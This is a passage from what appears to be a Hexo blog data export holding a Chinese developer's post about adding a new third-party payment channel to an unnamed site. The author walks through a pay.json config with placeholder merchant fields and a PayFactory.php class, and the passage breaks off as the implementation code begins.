CURLOPT_RETURNTRANSFER, true);\n\n    $response=curl_exec($ch);\n    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);\n\n    curl_close($ch);\n    if ($httpCode == 200) {\n        return $response;\n    } else {\n        return 0;\n    }\n}\n\n/**\n * 支付日志\n * @param  string $fileName 文件名,如：payerror.log或者pay/error.log\n * @param  array $data 数据\n */\nfunction payLog($fileName, $data)\n{\n    $pathLog = S_ROOT . 'caches' . DIRECTORY_SEPARATOR . 'log' . DIRECTORY_SEPARATOR . $fileName;\n    if (is_file($pathLog)) {\n        if (filesize($pathLog) >= 10000000) {\n            $new_file = dirname($pathLog) . '/' . date('Y_m_d_H_i_s').'_'  . basename($pathLog);\n            copy($pathLog,$new_file);\n            file_put_contents($pathLog, '<----' . date('Y-m-d H:i:s').'---->' . $data . \"\\n\");\n        }else {\n            file_put_contents($pathLog, '<----' . date('Y-m-d H:i:s').'---->' . $data . \"\\n\", FILE_APPEND);\n        }\n    }else {\n        file_put_contents($pathLog, '<----' . date('Y-m-d H:i:s').'---->' . $data . \"\\n\", FILE_APPEND);\n    }\n}\n```","slug":"2019/6/乐购菠菜添加支付方式","published":1,"updated":"2020-04-12T06:34:43.626Z","comments":1,"photos":[],"link":"","_id":"ck9z76vzt001f44vqkq0irgh3","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>突然有一天老板扔给我一个错误百出的文档（文档不规范，码农两行泪），让我往某不知名网站添加某不可描述支付</p>\n<a id=\"more\"></a>\n<h3 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h3><ul>\n<li><p>登录后台发现有添加第三方支付的菜单，但是发现只能更改配置，无法添加新的支付方式（知道不会这么简单）</p>\n</li>\n<li><p>进入数据库发现数据存储在<code>payment_config</code>表中，试着直接数据库添加查看数据变化，添加后发现只能出现在支付列表中，无法添加和更改配置</p>\n</li>\n<li><p>查看页面请求，直接阅读获取支付代码，发现有一个<code>pay.json</code>的配置文件，直接打开，部分代码如下</p>\n</li>\n</ul>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"attr\">\"nid\"</span>: <span class=\"string\">\"nid_pay\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"请选择类型\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"merchantID\"</span>: <span class=\"string\">\"支付平台提供给商家的账号\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"terminalID\"</span>: <span class=\"string\">\"支付平台提供给商家的终端号\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"merchantKey\"</span>: <span class=\"string\">\"支付平台提供个商家的密码（MD5加密时使用）\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"merchantPayKey\"</span>: <span class=\"string\">\"支付有关的其他秘钥或信息\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"partnerId\"</span>: <span class=\"string\">\"支付平台代理商账号\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"merchantPrivateKey\"</span>: <span class=\"string\">\"用户私钥（与用户公钥成对存在）\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"merchantPublicKey\"</span>: <span class=\"string\">\"用户公钥（与用户私钥成对存在）\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"platformPublicKey\"</span>: <span class=\"string\">\"平台公钥（平台提供，一般在商户登录支付平台后台管理页面获取）\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"merchantCertPath\"</span>: <span class=\"string\">\"商家证书\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"platformCertPath\"</span>: <span class=\"string\">\"平台证书\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"payBank\"</span>: [&#123;<span class=\"attr\">\"bank_id\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"code\"</span>:<span class=\"string\">\"ICBC\"</span>&#125;,&#123;<span class=\"attr\">\"bank_id\"</span>:<span class=\"number\">2</span>,<span class=\"attr\">\"code\"</span>:<span class=\"string\">\"ABC\"</span>&#125;,&#123;<span class=\"attr\">\"bank_id\"</span>:<span class=\"number\">9</span>,<span class=\"attr\">\"code\"</span>:<span class=\"string\">\"BOC\"</span>&#125;,&#123;<span class=\"attr\">\"bank_id\"</span>:<span class=\"number\">7</span>,<span class=\"attr\">\"code\"</span>:<span class=\"string\">\"CCB\"</span>&#125;,</span><br><span class=\"line\">        \t\t\t&#123;<span class=\"attr\">\"bank_id\"</span>:<span class=\"number\">10</span>,<span class=\"attr\">\"code\"</span>:<span class=\"string\">\"COMM\"</span>&#125;,&#123;<span class=\"attr\">\"bank_id\"</span>:<span class=\"number\">11</span>,<span class=\"attr\">\"code\"</span>:<span class=\"string\">\"CMB\"</span>&#125;,&#123;<span class=\"attr\">\"bank_id\"</span>:<span class=\"number\">14</span>,<span class=\"attr\">\"code\"</span>:<span class=\"string\">\"SPDB\"</span>&#125;,&#123;<span class=\"attr\">\"bank_id\"</span>:<span class=\"number\">26</span>,<span class=\"attr\">\"code\"</span>:<span class=\"string\">\"CIB\"</span>&#125;,</span><br><span class=\"line\">        \t\t\t&#123;<span class=\"attr\">\"bank_id\"</span>:<span class=\"number\">15</span>,<span class=\"attr\">\"code\"</span>:<span class=\"string\">\"CMBC\"</span>&#125;,&#123;<span class=\"attr\">\"bank_id\"</span>:<span class=\"number\">13</span>,<span class=\"attr\">\"code\"</span>:<span class=\"string\">\"GDB\"</span>&#125;,&#123;<span class=\"attr\">\"bank_id\"</span>:<span class=\"number\">12</span>,<span class=\"attr\">\"code\"</span>:<span class=\"string\">\"SPDB\"</span>&#125;,&#123;<span class=\"attr\">\"bank_id\"</span>:<span class=\"number\">8</span>,<span class=\"attr\">\"code\"</span>:<span class=\"string\">\"CEB\"</span>&#125;,</span><br><span class=\"line\">        \t\t\t&#123;<span class=\"attr\">\"bank_id\"</span>:<span class=\"number\">29</span>,<span class=\"attr\">\"code\"</span>:<span class=\"string\">\"HXB\"</span>&#125;,&#123;<span class=\"attr\">\"bank_id\"</span>:<span class=\"number\">3</span>,<span class=\"attr\">\"code\"</span>:<span class=\"string\">\"PSBC\"</span>&#125;,&#123;<span class=\"attr\">\"bank_id\"</span>:<span class=\"number\">6</span>,<span class=\"attr\">\"code\"</span>:<span class=\"string\">\"PAB\"</span>&#125;</span><br><span class=\"line\">    \t\t\t],</span><br><span class=\"line\">        <span class=\"attr\">\"pay_layers\"</span>: <span class=\"string\">\"1,2,3,5,4,6,7,8,9,10,11\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"payType\"</span>: [</span><br><span class=\"line\">\t        &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">1</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"微信扫码支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"支付配置信息\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"其他支付配置信息\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"端口类型：1=ios,2=android,3=h5,4=pc\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"string\">\"是否启用：1:启用;2:禁用\"</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"string\">\"返回数据or跳转页面：1：返回数据，2:跳转页面\"</span>&#125;,</span><br><span class=\"line\">\t        &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">2</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"微信WAP支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"WX_WAP\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">2</span>&#125;,</span><br><span class=\"line\">\t        &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">3</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"微信H5支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"WX_H5\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">2</span>&#125;,</span><br><span class=\"line\">\t        &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">4</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"支付宝扫码支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"ALI\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">1</span>&#125;,</span><br><span class=\"line\">\t        &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">5</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"支付宝WAP支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"ALI_WAP\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">2</span>&#125;,</span><br><span class=\"line\">\t        &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">6</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"支付宝H5支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"ALI_H5\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">2</span>&#125;,</span><br><span class=\"line\">\t        &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">7</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"QQ钱包扫码支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"QQ\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">1</span>&#125;,</span><br><span class=\"line\">\t        &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">8</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"QQ钱包WAP支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"QQ_WAP\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">2</span>&#125;,</span><br><span class=\"line\">\t        &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">9</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"QQ钱包H5支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"QQ_H5\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">2</span>&#125;,</span><br><span class=\"line\">\t        &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">10</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"网银支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"WY\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">2</span>&#125;,</span><br><span class=\"line\">\t        &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">11</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"网银H5支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"WY_H5\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">2</span>&#125;,</span><br><span class=\"line\">\t        &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">12</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"网银快捷支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"WY_KJ\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">2</span>&#125;,</span><br><span class=\"line\">        \t&#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">13</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"京东钱包扫码支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"JD\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">1</span>&#125;,</span><br><span class=\"line\">\t        &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">14</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"京东钱包WAP支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"JD_WAP\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">2</span>&#125;,</span><br><span class=\"line\">\t        &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">15</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"京东钱包H5支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"JD_H5\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">2</span>&#125;,</span><br><span class=\"line\">\t        &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">16</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"银联钱包扫码支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"UN\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">1</span>&#125;,</span><br><span class=\"line\">\t        &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">17</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"银联钱包WAP支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"UN_WAP\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">2</span>&#125;,</span><br><span class=\"line\">\t        &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">18</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"银联钱包H5支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"UN_H5\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">2</span>&#125;,</span><br><span class=\"line\">          &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">19</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"网关支付扫码\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"gateway\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">2</span>&#125;,</span><br><span class=\"line\">          &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">20</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"微信公众账号\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"weixinjsapi\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">1</span>&#125;,</span><br><span class=\"line\">          &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">21</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"支付宝服务窗支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"weixinjsapi\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">1</span>&#125;,</span><br><span class=\"line\">          &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">22</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"支付宝app支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"alipayapp\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">1</span>&#125;,</span><br><span class=\"line\">          &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">23</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"苏宁扫码支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"suning\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">1</span>&#125;</span><br><span class=\"line\">\t        ],</span><br><span class=\"line\">        <span class=\"attr\">\"sort\"</span>: <span class=\"number\">0</span></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"attr\">\"nid\"</span>: <span class=\"string\">\"hua_yin_pay\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"华银\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"merchantID\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"merchantPrivateKey\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"merchantPublicKey\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"platformPublicKey\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"payType\"</span>: [</span><br><span class=\"line\">        \t&#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">1</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"微信扫码支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"weixin_scan\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">1</span>&#125;,</span><br><span class=\"line\">        \t&#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">4</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"支付宝扫码支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"alipay_scan\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">1</span>&#125;,</span><br><span class=\"line\">        \t&#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">7</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"QQ钱包宝扫码支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"tenpay_scan\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">1</span>&#125;,</span><br><span class=\"line\">        \t&#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">10</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"网银支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"direct_pay\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">2</span>&#125;</span><br><span class=\"line\">        ]</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n<p>思路已经清晰了，直接从文件中添加了一个新的支付配置，果然后台支付列表中出现了，添加上该支付的配置参数</p>\n<ul>\n<li>添加后，发起支付，报无此支付方式的错误，直接在代码中搜索这个错误信息，找到这个<code>PayFactory.php</code>工厂类，部分代码如下</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by Kevin.</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@author</span> kevin</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@copyright</span> HCHT 2017/9/15 17:06</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@description</span> 支付工厂类</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"></span><br><span class=\"line\">include_cache(S_CORE . <span class=\"string\">'class'</span> . DS . <span class=\"string\">'pay'</span>  . DS . <span class=\"string\">'chengyi.php'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">PayFactory</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getInterface</span><span class=\"params\">($payMent)</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">switch</span> ($payMent) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"string\">'cheng_yi_pay'</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> cheng_yi_pay();</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            <span class=\"keyword\">default</span>:</span><br><span class=\"line\">                ErrorCode::errorResponse(<span class=\"number\">200015</span>, <span class=\"string\">'线上支付方式不存在'</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>思路已经很明朗了，创建一个支付类，添加上case分支</p>\n<ul>\n<li>随便打开一个支付类，根据它的部分逻辑，接入新的支付逻辑，处理异步回调时，发现有两个回调可供选择，一个在<code>recharge.php</code>中，一个在根目录下的<code>rechargeNotify.php</code>中，同步回调在根目录下<code>beeePayOk.php</code>，具体可阅读代码，没有必要张贴</li>\n</ul>\n<h3 id=\"实现\"><a href=\"#实现\" class=\"headerlink\" title=\"实现\"></a>实现</h3><p>具体的支付类代码，仅供参考，每个支付的具体实现都有差别</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span 